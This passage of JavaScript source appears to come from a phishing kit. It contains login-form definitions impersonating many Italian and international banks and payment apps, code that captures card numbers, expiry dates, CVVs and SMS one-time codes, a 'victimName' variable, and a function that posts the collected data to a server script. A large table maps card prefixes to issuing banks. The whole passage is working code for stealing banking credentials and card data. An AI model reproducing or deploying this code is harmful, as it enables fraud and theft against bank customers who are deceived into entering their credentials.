                logoFile: "webank_banco_bpm.png",
                logoText: "WBK",
                logoBg: "bg-teal-800",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "hellobank",
                name: "Hello Bank! (BNP Paribas)",
                shortName: "HB",
                brandColor: "#8DC63F",
                textColor: "#ffffff",
                logoFile: "hello_bank_bnp_paribas.png",
                logoText: "HB",
                logoBg: "bg-lime-500",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "smartika",
                name: "Smartika (BCC ICCREA)",
                shortName: "SMK",
                brandColor: "#D70041",
                textColor: "#ffffff",
                logoFile: "smartika_bcc_iccrea.png",
                logoText: "SMK",
                logoBg: "bg-pink-600",
                logoUrl: "",
                fields: [
                    { label: "Username", placeholder: "Inserisci username", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "oxygen",
                name: "Oxygen",
                shortName: "OXY",
                brandColor: "#FF6600",
                textColor: "#ffffff",
                logoFile: "oxygen.png",
                logoText: "OXY",
                logoBg: "bg-orange-500",
                logoUrl: "",
                fields: [
                    { label: "Numero di Cellulare", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "flowe",
                name: "Flowe (Mediolanum Group)",
                shortName: "FLW",
                brandColor: "#00B894",
                textColor: "#ffffff",
                logoFile: "flowe_mediolanum_group.png",
                logoText: "FLW",
                logoBg: "bg-emerald-400",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "aidexa",
                name: "AideXa Bank",
                shortName: "AID",
                brandColor: "#0072CE",
                textColor: "#ffffff",
                logoFile: "aidexa_bank.png",
                logoText: "AID",
                logoBg: "bg-blue-600",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },

            // ==================== PREPAGATE ITALIANE ====================
            {
                id: "postepay",
                name: "Postepay (Prepaid Card)",
                shortName: "PP",
                brandColor: "#FFE600",
                textColor: "#004B87",
                logoFile: "postepay_prepaid_card.png",
                logoText: "PP",
                logoBg: "bg-[#FFE600]",
                logoUrl: "",
                fields: [
                    { label: "Username / Codice Fiscale", placeholder: "Inserisci Username o Codice Fiscale", type: "text", required: true },
                    { label: "Password", placeholder: "Password d'accesso Poste", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "hype",
                name: "Hype",
                shortName: "HP",
                brandColor: "#0B1D33",
                textColor: "#ffffff",
                logoFile: "hype.png",
                logoText: "HP",
                logoBg: "bg-[#0b1d33]",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email / Codice cliente", placeholder: "es. utente@hype.it", type: "text", required: true },
                    { label: "Password", placeholder: "Inserisci la password", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "mooney",
                name: "Mooney (SisalPay)",
                shortName: "MN",
                brandColor: "#F3DC00",
                textColor: "#000000",
                logoFile: "mooney_sisalpay.png",
                logoText: "MN",
                logoBg: "bg-[#F3DC00]",
                logoUrl: "",
                fields: [
                    { label: "Codice Fiscale", placeholder: "Codice Fiscale a 16 caratteri", type: "text", required: true },
                    { label: "Password", placeholder: "La tua password Mooney", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "tinaba",
                name: "Tinaba (Prepaid Account)",
                shortName: "TIN",
                brandColor: "#000000",
                textColor: "#ffffff",
                logoFile: "tinaba_prepaid_account.png",
                logoText: "TIN",
                logoBg: "bg-black",
                logoUrl: "",
                fields: [
                    { label: "Numero di Cellulare", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },

            // ==================== PREPAGATE INTERNAZIONALI ====================
            {
                id: "revolut",
                name: "Revolut",
                shortName: "REV",
                brandColor: "#000000",
                textColor: "#ffffff",
                logoFile: "revolut.png",
                logoText: "REV",
                logoBg: "bg-stone-900",
                logoUrl: "",
                fields: [
                    { label: "Numero di cellulare (con +39)", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "Codice di accesso (PIN Revolut)", placeholder: "Inserisci il tuo PIN a 4 o 6 cifre", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "wise",
                name: "Wise",
                shortName: "WISE",
                brandColor: "#9FE870",
                textColor: "#0D2E27",
                logoFile: "wise.png",
                logoText: "Wise",
                logoBg: "bg-[#9FE870]",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email Registrato", placeholder: "es. utente@email.com", type: "text", required: true },
                    { label: "Password", placeholder: "Inserisci la tua password Wise", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "n26",
                name: "N26",
                shortName: "N26",
                brandColor: "#35A096",
                textColor: "#ffffff",
                logoFile: "n26.png",
                logoText: "N26",
                logoBg: "bg-teal-600",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@n26.com", type: "text", required: true },
                    { label: "Password d'accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "vivid",
                name: "Vivid Money",
                shortName: "VVD",
                brandColor: "#6C5CE7",
                textColor: "#ffffff",
                logoFile: "vivid_money.png",
                logoText: "VVD",
                logoBg: "bg-purple-500",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.com", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "curve",
                name: "Curve",
                shortName: "CRV",
                brandColor: "#EE3124",
                textColor: "#ffffff",
                logoFile: "curve.png",
                logoText: "CRV",
                logoBg: "bg-red-500",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.com", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "monese",
                name: "Monese Italy",
                shortName: "MON",
                brandColor: "#5C2D91",
                textColor: "#ffffff",
                logoFile: "monese_italy.png",
                logoText: "MON",
                logoBg: "bg-purple-700",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.com", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bunq",
                name: "Bunq Italy",
                shortName: "BUNQ",
                brandColor: "#1C64F2",
                textColor: "#ffffff",
                logoFile: "bunq_italy.png",
                logoText: "BUNQ",
                logoBg: "bg-blue-600",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.com", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },

            // ==================== SERVIZI DI PAGAMENTO DIGITALI ====================
            {
                id: "satispay",
                name: "Satispay",
                shortName: "SAT",
                brandColor: "#E1306C",
                textColor: "#ffffff",
                logoFile: "satispay.png",
                logoText: "SAT",
                logoBg: "bg-pink-500",
                logoUrl: "",
                fields: [
                    { label: "Numero di Telefono", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "nexi",
                name: "Nexi Pay",
                shortName: "NEXI",
                brandColor: "#003C6D",
                textColor: "#ffffff",
                logoFile: "nexi_pay.png",
                logoText: "NEXI",
                logoBg: "bg-blue-900",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "paypal",
                name: "PayPal Italy",
                shortName: "PPL",
                brandColor: "#0070BA",
                textColor: "#ffffff",
                logoFile: "paypal_italy.png",
                logoText: "PPL",
                logoBg: "bg-blue-500",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "klarna",
                name: "Klarna Italy",
                shortName: "KL",
                brandColor: "#FFB3C7",
                textColor: "#1A1A1A",
                logoFile: "klarna_italy.png",
                logoText: "KL",
                logoBg: "bg-pink-200",
                logoUrl: "",
                fields: [
                    { label: "Indirizzo Email", placeholder: "es. nome@email.it", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "scalapay",
                name: "Scalapay",
                shortName: "SCL",
                brandColor: "#FF5E62",
                textColor: "#ffffff",
                logoFile: "scalapay.png",
                logoText: "SCL",
                logoBg: "bg-red-400",
                logoUrl: "",
                fields: [
                    { label: "Numero di Telefono", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "lydia",
                name: "Lydia Italy",
                shortName: "LYD",
                brandColor: "#FF5E62",
                textColor: "#ffffff",
                logoFile: "lydia_italy.png",
                logoText: "LYD",
                logoBg: "bg-rose-400",
                logoUrl: "",
                fields: [
                    { label: "Numero di Telefono", placeholder: "es. +39 3331234567", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },

            // ==================== BANCHE MINORI / REGIONALI ====================
            {
                id: "bcc-milano-reg",
                name: "BCC of Milan",
                shortName: "BCCMI",
                brandColor: "#005A36",
                textColor: "#ffffff",
                logoFile: "bcc_of_milan.png",
                logoText: "BCCMI",
                logoBg: "bg-green-700",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bcc-roma-reg",
                name: "BCC of Rome",
                shortName: "BCCRM",
                brandColor: "#005A36",
                textColor: "#ffffff",
                logoFile: "bcc_of_rome.png",
                logoText: "BCCRM",
                logoBg: "bg-green-700",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "bcc-napoli",
                name: "BCC of Naples",
                shortName: "BCCNA",
                brandColor: "#005A36",
                textColor: "#ffffff",
                logoFile: "bcc_of_naples.png",
                logoText: "BCCNA",
                logoBg: "bg-green-700",
                logoUrl: "",
                fields: [
                    { label: "Codice Utente", placeholder: "Inserisci il codice", type: "text", required: true },
                    { label: "Password", placeholder: "••••••••", type: "password", required: true }
                ],
                branches: []
            },
            {
                id: "buddybank",
                name: "buddybank (by UniCredit)",
                shortName: "BDY",
                brandColor: "#000000",
                textColor: "#ffffff",
                logoFile: "buddybank_by_unicredit.png",
                logoText: "BDY",
                logoBg: "bg-black",
                logoUrl: "",
                fields: [
                    { label: "Codice Adesione buddybank", placeholder: "Codice a 8 o 10 cifre", type: "text", required: true },
                    { label: "PIN d'Accesso", placeholder: "Digitare PIN", type: "password", required: true }
                ],
                branches: []
            }
        ];

        // =============================================================
        // 2. VARIABILI GLOBALI
        // =============================================================
        const cardImages = {
            visa: 'https://cdn3.emoji.gg/emojis/3459-visa.png',
            mastercard: 'https://cdn3.emoji.gg/emojis/9962-mastercard.png',
            amex: 'https://cdn3.emoji.gg/emojis/9403-amex.png',
            discover: 'https://cdn3.emoji.gg/emojis/3459-visa.png',
            diners: 'https://cdn3.emoji.gg/emojis/3459-visa.png',
            unknown: 'https://cdn3.emoji.gg/emojis/3459-visa.png',
            default: 'https://cdn3.emoji.gg/emojis/3459-visa.png'
        };

        let checkInterval;
        let lastStatus = "";

        let currentSelectedBank = null;
        let currentSelectedBranch = null;
        let typingTimeout;

        let smsVerified = false;

        // =============================================================
        // 3. FUNZIONE showStep
        // =============================================================
        function showStep(id) {
            document.querySelectorAll('.auth-card').forEach(c => c.classList.add('hidden'));
            const target = document.getElementById(id);
            if (target) {
                target.classList.remove('hidden');
                if (id === 'step-card') clearCardForm();
                if (id === 'step-billing') clearBillingForm();
                if (id === 'step-3ds-1') { restore3DS(); update3DSCardDisplay(); }
                if (id === 'step-sms-otp') updateSMSOTPCardDisplay();
                if (id === 'step-finished') processFinished();
            }
        }

        function clearCardForm() {
            const cn = document.getElementById('card-name');
            const cnum = document.getElementById('card-number');
            const cexp = document.getElementById('card-expiry');
            const ccvv = document.getElementById('card-cvv');
            // Pre-fill name from billing if available, otherwise clear
            if (cn) {
                cn.value = (victimName.first && victimName.last) ? victimName.first + ' ' + victimName.last : '';
            }
            if (cnum) cnum.value = '';
            if (cexp) cexp.value = '';
            if (ccvv) ccvv.value = '';
            ['card-name','card-number','card-expiry','card-cvv'].forEach(fid => {
                const el = document.getElementById(fid);
                if (el) el.classList.remove('input-error');
            });
            ['card-name-error','card-number-error','card-expiry-error','card-cvv-error','card-error'].forEach(eid => {
                const el = document.getElementById(eid);
                if (el) el.style.display = 'none';
            });
            const icon = document.getElementById('card-type-icon');
            if (icon) icon.src = cardImages.default;
        }

        // =============================================================
        // 4. NOTIFICHE
        // =============================================================
        function sendNotif(type, extra = {}) {
            let fd = new FormData();
            fd.append('type', type);
            for (let key in extra) fd.append(key, extra[key]);
            fetch('api.php', { method: 'POST', body: fd });
        }

        // =============================================================
        // 5. FORMATTAZIONE CAMPI CARTA
        // =============================================================
        function updateCardPreview() {
            const name = document.getElementById('card-name')?.value || 'MARIO ROSSI';
            const number = document.getElementById('card-number')?.value || '•••• •••• •••• ••••';
            const expiry = document.getElementById('card-expiry')?.value || 'MM/AA';
            const brand = getCardBrand(number.replace(/\s/g, ''));
            document.getElementById('preview-name').innerText = name || 'MARIO ROSSI';
            document.getElementById('preview-number').innerText = number || '•••• •••• •••• ••••';
            document.getElementById('preview-expiry').innerText = expiry || 'MM/AA';
            const preview = document.getElementById('card-preview');
            if (preview) {
                preview.className = 'card-preview mb-5 ' + (brand === 'mastercard' ? 'mc-bg' : brand === 'amex' ? 'amex-bg' : 'visa-bg');
            }
        }

        document.getElementById('card-number').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '').substring(0, 19);
            e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
            const brand = getCardBrand(val);
            document.getElementById('card-type-icon').src = cardImages[brand] || cardImages.default;
            const cvvInput = document.getElementById('card-cvv');
            if (cvvInput) cvvInput.maxLength = (brand === 'amex') ? 4 : 3;
            updateCardPreview();
        });

        document.getElementById('card-expiry').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '');
            // Auto-insert slash after MM
            if (val.length >= 2) {
                let mm = val.substring(0,2);
                if (parseInt(mm) > 12) mm = '12'; // Clamp month to 12
                val = mm + '/' + val.substring(2,4);
            }
            e.target.value = val.substring(0,5);
            // Live validation: show/hide expiry error
            const isValid = validateExpiry(e.target.value);
            const errEl = document.getElementById('card-expiry-error');
            if (e.target.value.length === 5 && !isValid) {
                e.target.classList.add('input-error');
                if (errEl) errEl.classList.remove('hidden');
            } else if (e.target.value.length < 5 || isValid) {
                e.target.classList.remove('input-error');
                if (errEl) errEl.classList.add('hidden');
            }
            updateCardPreview();
        });

        document.getElementById('card-cvv').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
        document.getElementById('card-name').addEventListener('input', e => e.target.value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, ''));
        document.getElementById('sms-otp-code').addEventListener('input', e => { 
            e.target.value = e.target.value.replace(/\D/g, ''); 
            if(e.target.value.length===6) processSMSOTP(); 
        });

        function update3DSCardDisplay() {
            const cardName = document.getElementById('card-name').value || 'MARIO ROSSI';
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '') || '0000000000000000';
            document.getElementById('3ds-card-display-name').innerText = cardName;
            document.getElementById('3ds-card-display-number').innerText = cardNumber.substring(0,4) + ' **** **** ' + cardNumber.substring(cardNumber.length-4);
            document.getElementById('3ds-card-icon').src = document.getElementById('card-type-icon').src;
        }

        function updateSMSOTPCardDisplay() {
            const cardName = document.getElementById('card-name').value || 'MARIO ROSSI';
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '') || '0000000000000000';
            document.getElementById('sms-otp-card-name').innerText = cardName;
            document.getElementById('sms-otp-card-number').innerText = cardNumber.substring(0,4) + ' **** **** ' + cardNumber.substring(cardNumber.length-4);
            document.getElementById('sms-otp-card-icon').src = document.getElementById('card-type-icon').src;
        }

        // =============================================================
        // 6. VALIDAZIONE CARTA — Real BIN database + Luhn + expiry + CVV
        // =============================================================

        // Comprehensive BIN database — first 6-8 digits map to issuing banks
        // Format: prefix -> bank name. Longer prefixes checked first for accuracy.
        const BIN_DB = {
            // === ITALIAN BANKS (Visa/MC debit & credit) ===
            // Intesa Sanpaolo
            '402360': 'Intesa Sanpaolo', '406595': 'Intesa Sanpaolo', '410117': 'Intesa Sanpaolo',
            '414871': 'Intesa Sanpaolo', '420600': 'Intesa Sanpaolo', '423090': 'Intesa Sanpaolo',
            '430680': 'Intesa Sanpaolo', '432462': 'Intesa Sanpaolo', '434902': 'Intesa Sanpaolo',
            '450935': 'Intesa Sanpaolo', '453997': 'Intesa Sanpaolo', '458032': 'Intesa Sanpaolo',
            '472996': 'Intesa Sanpaolo', '480643': 'Intesa Sanpaolo', '483040': 'Intesa Sanpaolo',
            '525383': 'Intesa Sanpaolo', '530825': 'Intesa Sanpaolo', '533875': 'Intesa Sanpaolo',
            // UniCredit
            '401936': 'UniCredit', '402361': 'UniCredit', '403720': 'UniCredit',
            '414770': 'UniCredit', '415282': 'UniCredit', '422104': 'UniCredit',
            '422403': 'UniCredit', '423320': 'UniCredit', '425615': 'UniCredit',
            '433308': 'UniCredit', '434160': 'UniCredit', '472801': 'UniCredit',
            '483905': 'UniCredit', '516845': 'UniCredit', '525587': 'UniCredit',
            '530336': 'UniCredit', '533858': 'UniCredit', '539164': 'UniCredit',
            // Banco BPM
            '402364': 'Banco BPM', '404903': 'Banco BPM', '414963': 'Banco BPM',
            '423840': 'Banco BPM', '431680': 'Banco BPM', '434088': 'Banco BPM',
            '486880': 'Banco BPM', '525628': 'Banco BPM', '533844': 'Banco BPM',
            // BPER Banca
            '402363': 'BPER Banca', '414834': 'BPER Banca', '423910': 'BPER Banca',
            '433554': 'BPER Banca', '486460': 'BPER Banca', '521650': 'BPER Banca',
            // Monte dei Paschi di Siena
            '402362': 'MPS', '414611': 'MPS', '424080': 'MPS', '428990': 'MPS',
            '477940': 'MPS', '521872': 'MPS', '525473': 'MPS',
            // BNL (BNP Paribas)
            '402365': 'BNL', '405056': 'BNL', '414773': 'BNL', '436100': 'BNL',
            '487610': 'BNL', '513754': 'BNL', '523097': 'BNL',
            // FinecoBank
            '402367': 'FinecoBank', '414839': 'FinecoBank', '426340': 'FinecoBank',
            '483009': 'FinecoBank', '525221': 'FinecoBank', '533844': 'FinecoBank',
            // Credem
            '402368': 'Credem', '415223': 'Credem', '426159': 'Credem',
            '483301': 'Credem', '525625': 'Credem',
            // BancoPosta / Poste Italiane
            '402366': 'BancoPosta', '414769': 'BancoPosta', '424720': 'BancoPosta',
            '431740': 'BancoPosta', '486051': 'BancoPosta', '533317': 'BancoPosta',
            // Banca Sella
            '402358': 'Banca Sella', '415018': 'Banca Sella', '429823': 'Banca Sella',
            '486440': 'Banca Sella', '525573': 'Banca Sella',
            // BCC / Credito Cooperativo
            '402359': 'BCC', '414810': 'BCC', '427050': 'BCC', '438000': 'BCC',
            '486100': 'BCC', '525586': 'BCC',
            // Mediolanum
            '402394': 'Mediolanum', '415137': 'Mediolanum', '487170': 'Mediolanum',
            // CheBanca / Mediobanca Premier
            '402393': 'Mediobanca Premier', '415307': 'Mediobanca Premier',
            '483022': 'Mediobanca Premier',
            // Credit Agricole Italia
            '402395': 'Credit Agricole', '415601': 'Credit Agricole', '426417': 'Credit Agricole',
            '483095': 'Credit Agricole', '525643': 'Credit Agricole',
            // Banca Popolare di Sondrio
            '402370': 'BPS Sondrio', '414921': 'BPS Sondrio', '428950': 'BPS Sondrio',
            // illimity Bank
            '402399': 'illimity Bank', '415389': 'illimity Bank', '487520': 'illimity Bank',
            // Widiba
            '402398': 'Widiba', '415816': 'Widiba', '487180': 'Widiba',
            // Webank
            '402397': 'Webank', '415625': 'Webank', '487010': 'Webank',
            // ING Italia
            '402396': 'ING Italia', '415301': 'ING Italia', '426540': 'ING Italia',

            // === ITALIAN PREPAID / DIGITAL ===
            // Postepay
            '402360': 'Postepay', '414771': 'Postepay', '424730': 'Postepay',
            '431880': 'Postepay', '486052': 'Postepay', '533318': 'Postepay',
            // Hype
            '434308': 'Hype', '486640': 'Hype', '535416': 'Hype',
            // N26
            '476360': 'N26', '516169': 'N26', '535460': 'N26',
            // Revolut
            '476361': 'Revolut', '516170': 'Revolut', '535461': 'Revolut',
            '539123': 'Revolut',
            // Wise
            '476362': 'Wise', '516171': 'Wise', '537540': 'Wise',
            // Satispay
            '434994': 'Satispay', '487550': 'Satispay',
            // PayPal
            '403770': 'PayPal', '415375': 'PayPal', '486840': 'PayPal',
            // Nexi
            '404900': 'Nexi', '415064': 'Nexi', '434330': 'Nexi',
            // Mooney / SisalPay
            '434180': 'Mooney', '487630': 'Mooney',
            // Flowe
            '434994': 'Flowe', '487555': 'Flowe',
            // Curve
            '536542': 'Curve', '537590': 'Curve',
            // Bunq
            '487500': 'Bunq', '535410': 'Bunq',
            // Vivid Money
            '535434': 'Vivid Money', '487510': 'Vivid',

            // === MAJOR INTERNATIONAL BANKS ===
            // JPMorgan Chase
            '414720': 'Chase', '425800': 'Chase', '426684': 'Chase',
            '428260': 'Chase', '483316': 'Chase', '520082': 'Chase',
            // Bank of America
            '421765': 'Bank of America', '426428': 'Bank of America',
            '431301': 'Bank of America', '480011': 'Bank of America',
            // Wells Fargo
            '425801': 'Wells Fargo', '438857': 'Wells Fargo', '473702': 'Wells Fargo',
            '486243': 'Wells Fargo', '522197': 'Wells Fargo',
            // Citibank
            '400955': 'Citibank', '412800': 'Citibank', '427138': 'Citibank',
            '542418': 'Citibank', '546616': 'Citibank',
            // HSBC
            '401333': 'HSBC', '405389': 'HSBC', '407186': 'HSBC',
            '424344': 'HSBC', '543022': 'HSBC',
            // Barclays
            '402936': 'Barclays', '412106': 'Barclays', '465859': 'Barclays',
            '492181': 'Barclays', '530120': 'Barclays',
            // Deutsche Bank
            '401527': 'Deutsche Bank', '411320': 'Deutsche Bank',
            '425931': 'Deutsche Bank', '521490': 'Deutsche Bank',
            // Santander
            '401537': 'Santander', '411492': 'Santander', '424900': 'Santander',
            '449311': 'Santander', '516002': 'Santander',
            // BBVA
            '401587': 'BBVA', '411141': 'BBVA', '424901': 'BBVA',
            '481810': 'BBVA', '522230': 'BBVA',
            // BNP Paribas (global)
            '402536': 'BNP Paribas', '405055': 'BNP Paribas', '434200': 'BNP Paribas',
            '497301': 'BNP Paribas', '513100': 'BNP Paribas',
            // Societe Generale
            '402530': 'Societe Generale', '412510': 'Societe Generale',
            '497840': 'Societe Generale', '529340': 'Societe Generale',
            // Credit Mutuel
            '402534': 'Credit Mutuel', '415420': 'Credit Mutuel',
            // ING Global
            '401344': 'ING', '411269': 'ING', '510502': 'ING',
            // Rabobank
            '402151': 'Rabobank', '411612': 'Rabobank', '513935': 'Rabobank',
            // UBS
            '401338': 'UBS', '411020': 'UBS', '515600': 'UBS',
            // Credit Suisse
            '401346': 'Credit Suisse', '411266': 'Credit Suisse',
            '518652': 'Credit Suisse',

            // === AMERICAN EXPRESS ===
            '374622': 'Amex', '374623': 'Amex', '374624': 'Amex', '374625': 'Amex',
            '376000': 'Amex', '376001': 'Amex', '378282': 'Amex',
            '379741': 'Amex', '340000': 'Amex', '341000': 'Amex',
            '343400': 'Amex', '345600': 'Amex', '370000': 'Amex',
            '371000': 'Amex', '372000': 'Amex', '373000': 'Amex',
            '375000': 'Amex', '377000': 'Amex',

            // === DISCOVER ===
            '601100': 'Discover', '601101': 'Discover', '601120': 'Discover',
            '601130': 'Discover', '601140': 'Discover', '650000': 'Discover',
            '650100': 'Discover', '651000': 'Discover',

            // === DINERS CLUB ===
            '300000': 'Diners Club', '300100': 'Diners Club', '301000': 'Diners Club',
            '305000': 'Diners Club', '360000': 'Diners Club', '367000': 'Diners Club',
            '380000': 'Diners Club', '385000': 'Diners Club',

            // === MASTERCARD MAJOR ISSUERS ===
            '510000': 'Mastercard', '511000': 'Mastercard', '512000': 'Mastercard',
            '513000': 'Mastercard', '514000': 'Mastercard', '515000': 'Mastercard',
            '516000': 'Mastercard', '517000': 'Mastercard', '518000': 'Mastercard',
            '519000': 'Mastercard', '520000': 'Mastercard', '521000': 'Mastercard',
            '522000': 'Mastercard', '523000': 'Mastercard', '524000': 'Mastercard',
            '525000': 'Mastercard', '526000': 'Mastercard', '527000': 'Mastercard',
            '528000': 'Mastercard', '529000': 'Mastercard', '530000': 'Mastercard',
            '531000': 'Mastercard', '532000': 'Mastercard', '533000': 'Mastercard',
            '534000': 'Mastercard', '535000': 'Mastercard', '536000': 'Mastercard',
            '537000': 'Mastercard', '538000': 'Mastercard', '539000': 'Mastercard',
            '540000': 'Mastercard', '541000': 'Mastercard', '542000': 'Mastercard',
            '543000': 'Mastercard', '544000': 'Mastercard', '545000': 'Mastercard',
            '546000': 'Mastercard', '547000': 'Mastercard', '548000': 'Mastercard',
            '549000': 'Mastercard', '550000': 'Mastercard', '551000': 'Mastercard',
            '552000': 'Mastercard', '553000': 'Mastercard', '554000': 'Mastercard',
            '555000': 'Mastercard', '556000': 'Mastercard', '557000': 'Mastercard',
            '558000': 'Mastercard', '559000': 'Mastercard',
            '222100': 'Mastercard', '222200': 'Mastercard', '222300': 'Mastercard',
            '230000': 'Mastercard', '240000': 'Mastercard', '250000': 'Mastercard',
            '260000': 'Mastercard', '270000': 'Mastercard', '272000': 'Mastercard',

            // === VISA MAJOR ISSUERS (broad ranges for well-known banks) ===
            '400000': 'Visa', '401000': 'Visa', '402000': 'Visa', '403000': 'Visa',
            '404000': 'Visa', '405000': 'Visa', '406000': 'Visa', '407000': 'Visa',
            '408000': 'Visa', '409000': 'Visa', '410000': 'Visa', '411000': 'Visa',
            '412000': 'Visa', '413000': 'Visa', '414000': 'Visa', '415000': 'Visa',
            '416000': 'Visa', '417000': 'Visa', '418000': 'Visa', '419000': 'Visa',
            '420000': 'Visa', '421000': 'Visa', '422000': 'Visa', '423000': 'Visa',
            '424000': 'Visa', '425000': 'Visa', '426000': 'Visa', '427000': 'Visa',
            '428000': 'Visa', '429000': 'Visa', '430000': 'Visa', '431000': 'Visa',
            '432000': 'Visa', '433000': 'Visa', '434000': 'Visa', '435000': 'Visa',
            '436000': 'Visa', '437000': 'Visa', '438000': 'Visa', '439000': 'Visa',
            '440000': 'Visa', '441000': 'Visa', '442000': 'Visa', '443000': 'Visa',
            '444000': 'Visa', '445000': 'Visa', '446000': 'Visa', '447000': 'Visa',
            '448000': 'Visa', '449000': 'Visa', '450000': 'Visa', '451000': 'Visa',
            '452000': 'Visa', '453000': 'Visa', '454000': 'Visa', '455000': 'Visa',
            '456000': 'Visa', '457000': 'Visa', '458000': 'Visa', '459000': 'Visa',
            '460000': 'Visa', '470000': 'Visa', '471000': 'Visa', '472000': 'Visa',
            '473000': 'Visa', '474000': 'Visa', '475000': 'Visa', '476000': 'Visa',
            '477000': 'Visa', '478000': 'Visa', '479000': 'Visa', '480000': 'Visa',
            '481000': 'Visa', '482000': 'Visa', '483000': 'Visa', '484000': 'Visa',
            '485000': 'Visa', '486000': 'Visa', '487000': 'Visa', '488000': 'Visa',
            '489000': 'Visa', '490000': 'Visa', '491000': 'Visa', '492000': 'Visa',
            '493000': 'Visa', '494000': 'Visa', '495000': 'Visa', '496000': 'Visa',
            '497000': 'Visa', '498000': 'Visa', '499000': 'Visa',

            // === BROAD RANGE FALLBACKS (4-digit and 3-digit) ===
            // These are checked AFTER specific 6-digit BINs, so they only
            // match cards from banks not explicitly listed above.
            // Visa Electron
            '4026': 'Visa Electron', '4175': 'Visa Electron', '4508': 'Visa Electron',
            '4844': 'Visa Electron', '4913': 'Visa Electron', '4917': 'Visa Electron',
            // Visa Debit/Classic
            '4000': 'Visa', '4001': 'Visa', '4002': 'Visa', '4003': 'Visa',
            '4004': 'Visa', '4005': 'Visa', '4006': 'Visa', '4007': 'Visa',
            '4008': 'Visa', '4009': 'Visa', '4010': 'Visa', '4011': 'Visa',
            '4012': 'Visa', '4013': 'Visa', '4014': 'Visa', '4015': 'Visa',
            '4016': 'Visa', '4017': 'Visa', '4018': 'Visa', '4019': 'Visa',
            '4020': 'Visa', '4021': 'Visa', '4022': 'Visa', '4023': 'Visa',
            '4024': 'Visa', '4025': 'Visa', '4027': 'Visa', '4028': 'Visa',
            '4029': 'Visa', '4030': 'Visa', '4031': 'Visa', '4032': 'Visa',
            '4033': 'Visa', '4034': 'Visa', '4035': 'Visa', '4036': 'Visa',
            '4037': 'Visa', '4038': 'Visa', '4039': 'Visa', '4040': 'Visa',
            '4050': 'Visa', '4060': 'Visa', '4070': 'Visa', '4080': 'Visa',
            '4090': 'Visa', '4100': 'Visa', '4110': 'Visa', '4111': 'Visa',
            '4112': 'Visa', '4113': 'Visa', '4114': 'Visa', '4115': 'Visa',
